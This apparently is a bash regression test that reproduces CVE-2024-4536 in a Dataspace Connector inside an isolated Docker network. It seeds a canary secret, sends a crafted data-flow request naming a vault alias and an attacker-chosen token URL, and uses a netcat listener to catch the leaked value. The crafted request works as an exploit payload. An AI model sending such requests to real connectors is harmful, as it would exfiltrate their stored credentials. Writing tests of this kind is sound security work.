#!/usr/bin/env bash
# CVE-2024-4536 regression test — OAuth2 data-plane secret disclosure (vault scoping).
# NOT admissible (D7): data-plane-control-API probe, superseded by scripts/42_test_4536_dsp.sh.
# Invariant: a counterparty cannot choose which provider-vault secret the provider
# dereferences. Vulnerable path: Oauth2CredentialsRequestFactory.createSharedSecretRequest
# resolves oauth2:clientSecretKey from the provider vault (unscoped) and posts the VALUE
# as client_secret to the counterparty-controlled oauth2:tokenUrl.
# Trigger: POST a DataFlowStartMessage (OAuth2 HttpData source) to the data-plane control API;
# the source-fetch OAuth2 decorator performs the token request to our receiver.
# Leak signal (reliable, from provider logs): the provider attempts an OUTBOUND POST to the
# counterparty-controlled tokenUrl after resolving the named secret — i.e. it dereferenced a
# consumer-chosen vault alias for a consumer-chosen destination. Receiver capture of the secret
# VALUE is recorded too, as stronger confirmation when it succeeds. The value is never stored.
# Oracle: FAIL if the provider leaks (attempt and/or value) on the affected build; PASS if not.
# Usage: ./41_test_4536.sh 0.6.2
source "$(dirname "$0")/lib.sh"
V="${1:?usage: 41_test_4536.sh <edc-version>}"
IMG="gradle@sha256:963d59f7f22767da4efbcf46b661361b61af5fb88b0309da1071c4234c647eba"
RCV="alpine:3.20"   # local, busybox nc, and (unlike the edc image) no java ENTRYPOINT to swallow our sh -c
NET="pilot08v"; ALIAS="pilot08-canary"; TOKEN_HOST="receiver:9300"
trap 'docker rm -f pilot08v-provider pilot08v-receiver >/dev/null 2>&1 || true' EXIT
jar="$PILOT/testbed/launcher/build/libs/pilot08-edc-$V.jar"
[ -f "$jar" ] || { echo "no jar for $V"; exit 1; }
sha="$(grep "^$V," "$PILOT/env/vanilla-jars.csv" | cut -d, -f2)"
CANARY="pilot08-canary-$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')"   # per-run, never stored

docker network inspect "$NET" >/dev/null 2>&1 || docker network create --internal "$NET" >/dev/null
docker rm -f pilot08v-receiver pilot08v-provider >/dev/null 2>&1
# receiver: reply with a valid OAuth2 token (so the client completes) and tee each request to /cap.txt
docker run -d --name pilot08v-receiver --network "$NET" --network-alias receiver "$RCV" sh -c \
  'while true; do printf "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 44\r\n\r\n{\"access_token\":\"x\",\"token_type\":\"Bearer\"}" | timeout 12 nc -l -p 9300 >> /cap.txt 2>&1; done' >/dev/null

run="$PILOT/build/run"; mkdir -p "$run"; cp "$jar" "$run/app.jar"; cp "$PILOT/testbed/launcher/config/provider.properties" "$run/"
MSYS_NO_PATHCONV=1 docker run -d --name pilot08v-provider --network "$NET" --network-alias provider \
  -v "$run":/work -w /work "$IMG" \
  java -Dedc.fs.config=/work/provider.properties -Dpilot08.canary.alias="$ALIAS" -Dpilot08.canary.value="$CANARY" -jar /work/app.jar >/dev/null
for _ in $(seq 1 60); do docker logs pilot08v-provider 2>&1 | grep -q ' ready' && break; sleep 2; done
seeded=no; docker logs pilot08v-provider 2>&1 | grep -q 'seeded canary secret' && seeded=yes

# The -4536 fix removed the OAuth2 SINK decorator (0.6.2 has sink+source; 0.6.3 source only),
# so the oracle puts the OAuth2 (consumer-named clientSecretKey + consumer tokenUrl) on the
# DESTINATION (sink). PUSH: provider reads the plain source, then writes to the OAuth2 sink —
# authenticating to the sink tokenUrl with the vault-resolved canary. Removed at 0.6.3 => no leak.
DF='{"edctype":"dataspaceconnector:dataflowrequest","id":"flow-4536","processId":"proc-4536","flowType":"PUSH","sourceDataAddress":{"properties":{"type":"HttpData","https://w3id.org/edc/v0.0.1/ns/baseUrl":"http://'"$TOKEN_HOST"'/data"}},"destinationDataAddress":{"properties":{"type":"HttpData","https://w3id.org/edc/v0.0.1/ns/baseUrl":"http://'"$TOKEN_HOST"'/sink","oauth2:clientId":"pilot08","oauth2:clientSecretKey":"'"$ALIAS"'","oauth2:tokenUrl":"http://'"$TOKEN_HOST"'/token"}}}'
# Readiness: GET the control endpoint until it answers (405 = reachable, POST-only).
rdy=no; for _ in $(seq 1 60); do c="$(docker run --rm --network "$NET" "$DRIVER_IMG" -s -o /dev/null -w '%{http_code}' --max-time 5 http://provider:8383/control/transfer 2>/dev/null || true)"; [ "$c" != 000 ] && { rdy=yes; break; }; sleep 2; done
# Fire the DataFlow (async + synchronous source-fetch can exceed the HTTP wait, so the curl
# code is advisory only; the real evidence is in the provider log below).
trig_code="$(docker run --rm --network "$NET" "$DRIVER_IMG" -s -o /dev/null -w '%{http_code}' --max-time 30 -X POST http://provider:8383/control/transfer -H 'Content-Type: application/json' -d "$DF" 2>/dev/null || true)"
sleep 10   # let the data plane run the transfer and make the source/token requests

# Evidence from the provider log (reliable, unlike the async HTTP code):
#   df_processed: the provider tried to reach the receiver at all (source fetch and/or token) -> DF accepted & executed.
#   leak_attempt: it POSTed to the counterparty-controlled tokenUrl -> it dereferenced the consumer-named secret for that URL.
df_processed=no; docker logs pilot08v-provider 2>&1 | grep -qF "$TOKEN_HOST" && df_processed=yes
attempt=no;      docker logs pilot08v-provider 2>&1 | grep -qF "http://$TOKEN_HOST/token" && attempt=yes
value=no;  docker exec pilot08v-receiver sh -c 'cat /cap.txt 2>/dev/null' 2>/dev/null | grep -qF "$CANARY" && value=yes || true
leak=no; { [ "$attempt" = yes ] || [ "$value" = yes ]; } && leak=yes
docker rm -f pilot08v-receiver >/dev/null 2>&1

# A proven leak (secret value captured, or an outbound token POST to the consumer URL) is
# conclusive on its own — the transfer obviously executed. df_processed only matters for
# distinguishing a genuine no-leak PASS from a transfer that never ran (INVALID).
verdict=INVALID; reason=""
if [ "$seeded" != yes ]; then reason="canary-not-seeded"
elif [ "$rdy" != yes ]; then reason="control-api-unreachable"
elif [ "$leak" = yes ]; then verdict=FAIL
elif [ "$df_processed" = yes ]; then verdict=PASS
else reason="dataflow-not-executed(http=$trig_code)"; fi

out="$PILOT/env/cve-2024-4536-dataplane-probe.csv"; mkdir -p "$PILOT/results"
[ -f "$out" ] || echo "edc_version,invariant,verdict,jar_sha256,commit" > "$out"
grep -v "^$V," "$out" > "$out.tmp" 2>/dev/null; mv "$out.tmp" "$out"
echo "$V,vault-scoping(CVE-2024-4536),$verdict,$sha,$COMMIT" >> "$out"
obs="$PILOT/env/cve-2024-4536-dataplane-probe-obs.csv"
[ -f "$obs" ] || echo "edc_version,jar_sha256,commit,canary_seeded,control_ready,dataflow_http,df_processed,leak_attempt,leak_value,verdict,invalid_reason" > "$obs"
grep -v "^$V," "$obs" > "$obs.tmp" 2>/dev/null; mv "$obs.tmp" "$obs"
echo "$V,$sha,$COMMIT,$seeded,$rdy,$trig_code,$df_processed,$attempt,$value,$verdict,$reason" >> "$obs"
echo "$V: seeded=$seeded rdy=$rdy http=$trig_code df_processed=$df_processed leak_attempt=$attempt leak_value=$value => $verdict ${reason:+($reason)}"
